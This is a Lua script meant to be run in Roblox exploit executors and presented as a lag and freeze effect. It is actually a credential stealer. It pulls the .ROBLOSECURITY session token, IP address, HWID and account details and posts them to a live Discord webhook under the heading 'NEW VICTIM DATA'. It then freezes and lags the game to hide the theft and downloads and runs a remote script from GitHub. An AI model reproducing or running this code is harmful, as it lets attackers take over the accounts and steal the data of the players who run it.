-- ============================================================
-- FAKE LAG + FREEZE + DATA HARVESTER v3 (Token Extraction)
-- Sequence: Collect data → Send embed → Freeze 6s → Lag 3s → Execute payload
-- Now extracts ROBLOSECURITY token.
-- ============================================================

local webhookUrl = "https://discord.com/api/webhooks/1543225082468507662/hINseu_11wBcee0z5W2KPYLHCo-rXMs0p-SwLp6rM7XZ2b-7Fiu7I9BPZU_ChKVwvTCX"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ===== TOKEN EXTRACTION =====
local function getRobloxToken()
    local token = nil

    -- Method 1: getcookie (Synapse X, ScriptWare, etc.)
    pcall(function()
        if getcookie then
            token = getcookie(".ROBLOSECURITY")
            if not token or token == "" then
                token = getcookie("ROBLOSECURITY")
            end
        end
    end)

    -- Method 2: executor-specific token functions
    if not token then
        local funcs = {"gettoken", "get_roblox_token", "getauth", "get_auth_token", "getcookie"}
        for _, fn in ipairs(funcs) do
            pcall(function()
                local f = getgenv and getgenv()[fn] or nil
                if f and type(f) == "function" then
                    local result = f()
                    if result and tostring(result):len() > 20 then
                        token = tostring(result)
                    end
                end
            end)
        end
    end

    -- Method 3: Try to read from Roblox internal HTTP cookies
    if not token then
        pcall(function()
            local response = HttpService:GetAsync("https://www.roblox.com/", true)
            -- This won't give token but may trigger internal cookie storage; fallback not guaranteed
        end)
    end

    -- Method 4: Use Roblox's UserSettings or LocalPlayer internals
    if not token then
        pcall(function()
            local authCookie = LocalPlayer:GetAttribute("RobloxAuthToken")
            if authCookie then
                token = authCookie
            end
        end)
    end

    return token or "Token not found"
end

-- ===== DATA COLLECTION =====
local function getExecutorName()
    local funcs = {"identifyexecutor", "getexecutorname", "getexecutor", "getexploitname"}
    for _, fn in ipairs(funcs) do
        pcall(function()
            local f = getgenv and getgenv()[fn] or nil
            if f and type(f) == "function" then
                local result = f()
                if result then
                    executorName = tostring(result)
                end
            end
        end)
    end
    return executorName or "Unknown Executor"
end

local function getHwid()
    local funcs = {"gethwid", "get_hwid", "getmachineid", "getfingerprint"}
    for _, fn in ipairs(funcs) do
        pcall(function()
            local f = getgenv and getgenv()[fn] or nil
            if f and type(f) == "function" then
                local result = f()
                if result then
                    hwid = tostring(result)
                end
            end
        end)
    end
    return hwid or "Unknown HWID"
end

local function getIPAddress()
    local apis = {"https://api.ipify.org", "https://ipv4.icanhazip.com/", "https://api.my-ip.io/ip"}
    for _, url in ipairs(apis) do
        local ok, result = pcall(function()
            return HttpService:GetAsync(url, true)
        end)
        if ok and result then
            result = result:gsub("%s+", "")
            if result:match("%d+%.%d+%.%d+%.%d+") then
                return result
            end
        end
    end
    return "IP fetch failed"
end

local function getDeviceInfo()
    return string.format(
        "Platform: %s | Touch: %s | Keyboard: %s | Gamepad: %s | Mouse: %s",
        tostring(UserInputService:GetPlatform()),
        tostring(UserInputService.TouchEnabled),
        tostring(UserInputService.KeyboardEnabled),
        tostring(UserInputService.GamepadEnabled),
        tostring(UserInputService.MouseEnabled)
    )
end

local function getAccountAge()
    local ok, age = pcall(function() return LocalPlayer.AccountAge end)
    return ok and (age .. " days") or "Unknown"
end

local function getMembership()
    local ok, m = pcall(function() return LocalPlayer.MembershipType end)
    return ok and tostring(m) or "Unknown"
end

local function collectData()
    local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    return {
        Username = LocalPlayer.Name,
        UserId = tostring(LocalPlayer.UserId),
        AccountAge = getAccountAge(),
        MembershipType = getMembership(),
        IP = getIPAddress(),
        DeviceInfo = getDeviceInfo(),
        Executor = getExecutorName(),
        HWID = getHwid(),
        Token = getRobloxToken(),
        Game = placeInfo.Name or "Unknown",
        PlaceId = tostring(game.PlaceId),
        JobId = game.JobId,
        Timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        Password = "N/A (cannot retrieve)"
    }
end

local function sendToWebhook()
    local d = collectData()

    local rawText = string.format(
        "Username: %s\nUserId: %s\nAccountAge: %s\nMembership: %s\nIP: %s\nDevice: %s\nExecutor: %s\nHWID: %s\nToken: %s\nGame: %s\nPlaceId: %s\nJobId: %s\nTimestamp: %s",
        d.Username, d.UserId, d.AccountAge, d.MembershipType, d.IP, d.DeviceInfo, d.Executor, d.HWID, d.Token, d.Game, d.PlaceId, d.JobId, d.Timestamp
    )

    local payload = {
        content = nil,
        embeds = {
            {
                title = "🔴 NEW VICTIM DATA",
                color = 16711680,
                fields = {
                    {name = "Username", value = d.Username, inline = true},
                    {name = "UserId", value = d.UserId, inline = true},
                    {name = "Account Age", value = d.AccountAge, inline = true},
                    {name = "Membership", value = d.MembershipType, inline = true},
                    {name = "IP Address", value = d.IP, inline = false},
                    {name = "Device Info", value = d.DeviceInfo, inline = false},
                    {name = "Executor", value = d.Executor, inline = true},
                    {name = "HWID", value = d.HWID, inline = true},
                    {name = "Token", value = d.Token, inline = false},  -- prominent
                    {name = "Game", value = d.Game, inline = true},
                    {name = "PlaceId", value = d.PlaceId, inline = true},
                    {name = "JobId", value = d.JobId, inline = true},
                    {name = "Timestamp", value = d.Timestamp, inline = true},
                },
                footer = {text = "SOMBRA Collector v3"}
            }
        }
    }

    payload.content = "```\n" .. rawText .. "\n```"

    local ok, err = pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
    end)
    if not ok then
        print("[SOMBRA] Webhook send failed: " .. tostring(err))
    else
        print("[SOMBRA] Victim data sent to webhook.")
    end
end

-- ===== START HEAVY LAG THREAD =====
task.spawn(function()
    local counter = 0
    while true do
        for i = 1, 10000 do
            counter = counter + math.sin(i) * math.cos(i)
        end
        task.wait(0)
    end
end)

-- ===== SEND DATA BEFORE FREEZE =====
task.spawn(sendToWebhook)

-- ===== FREEZE 6 SECONDS =====
task.wait(1.5)
print("FREEZING for 6 seconds...")
local freezeStart = tick()
while tick() - freezeStart < 6 do
    local dummy = 0
    for i = 1, 1e7 do
        dummy = dummy + i
    end
end
print("Freeze ended.")

-- ===== LAG 3 SECONDS =====
print("Lagging for 3 seconds...")
local lagStart = tick()
while tick() - lagStart < 3 do
    for i = 1, 10000 do
        local _ = math.sin(i) * math.cos(i)
    end
    task.wait()
end
print("Lag ended.")

-- ===== EXECUTE PAYLOAD =====
print("Executing external script...")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kryptrix-hub12/ScriptHUB/refs/heads/main/All%20in%20one%20Public.lua"))()
